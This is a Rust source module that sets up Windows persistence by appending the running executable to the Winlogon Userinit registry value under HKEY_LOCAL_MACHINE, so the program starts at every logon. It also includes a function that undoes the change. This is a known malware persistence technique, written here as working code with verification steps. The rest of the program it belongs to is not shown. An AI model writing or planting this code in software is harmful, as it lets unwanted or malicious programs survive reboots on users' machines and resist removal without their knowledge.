use crate::config::Config;
use crate::log_debug;
use anyhow::{Context, Result};
use std::env;
use winreg::enums::*;
use winreg::RegKey;

const WINLOGON_PATH: &str = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
const USERINIT_VALUE: &str = "Userinit";
const DEFAULT_USERINIT: &str = r"C:\Windows\system32\userinit.exe,";

pub async fn check_startup() -> Result<()> {
    let startup_config = Config::get_startup_config();

    if !startup_config.enabled {
        println!("Startup persistence disabled");
        return Ok(());
    }

    println!("Setting up Winlogon Userinit persistence...");

    match setup_winlogon() {
        Ok(_) => {
            println!("Winlogon Userinit persistence configured successfully!");
            Ok(())
        }
        Err(e) => {
            println!("Winlogon persistence failed: {}", e);
            Err(e)
        }
    }
}

fn setup_winlogon() -> Result<()> {
    let exe_path = env::current_exe()
        .context("Failed to get executable path")?
        .to_string_lossy()
        .to_string();

    println!("Executable path: {}", exe_path);

    // Open HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let winlogon = hklm.open_subkey_with_flags(WINLOGON_PATH, KEY_READ | KEY_WRITE)
        .context("Failed to open Winlogon key (requires Admin)")?;

    // Read current Userinit value
    let current_value: String = winlogon.get_value(USERINIT_VALUE)
        .unwrap_or_else(|_| DEFAULT_USERINIT.to_string());

    println!("Current Userinit value: {}", current_value);

    if !current_value.to_lowercase().contains("userinit.exe") {
        anyhow::bail!(
            "Userinit value doesn't contain userinit.exe - aborting for safety. Current value: {}",
            current_value
        );
    }

    if current_value.to_lowercase().contains(&exe_path.to_lowercase()) {
        println!("Winlogon persistence already configured");
        return Ok(());
    }

    let base_value = if current_value.ends_with(',') {
        current_value.clone()
    } else {
        format!("{},", current_value)
    };

    let new_value = format!("{}{},", base_value, exe_path);
    println!("New Userinit value: {}", new_value);

    // Write the new value
    winlogon.set_value(USERINIT_VALUE, &new_value).context("Failed to write Userinit value")?;
    let verify_value: String = winlogon.get_value(USERINIT_VALUE)
        .context("Failed to verify Userinit value")?;

    if verify_value != new_value {
        anyhow::bail!(
            "Userinit verification failed. Expected: '{}', Got: '{}'",
            new_value, verify_value
        );
    }

    println!("Winlogon persistence verified!");

    Ok(())
}

#[allow(dead_code)]
pub fn remove_winlogon() -> Result<()> {
    let exe_path = env::current_exe()
        .context("Failed to get executable path")?
        .to_string_lossy()
        .to_string();

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let winlogon = hklm.open_subkey_with_flags(WINLOGON_PATH, KEY_READ | KEY_WRITE)
        .context("Failed to open Winlogon key")?;

    let current_value: String = winlogon.get_value(USERINIT_VALUE)
        .unwrap_or_else(|_| DEFAULT_USERINIT.to_string());

    let cleaned_value = current_value
        .replace(&format!("{},", exe_path), "")
        .replace(&format!(",{}", exe_path), "");

    let final_value = if cleaned_value.to_lowercase().contains("userinit.exe") {
        cleaned_value
    } else {
        DEFAULT_USERINIT.to_string()
    };

    winlogon.set_value(USERINIT_VALUE, &final_value)
        .context("Failed to restore Userinit value")?;

    println!("Winlogon persistence removed. Restored to: {}", final_value);

    Ok(())
}
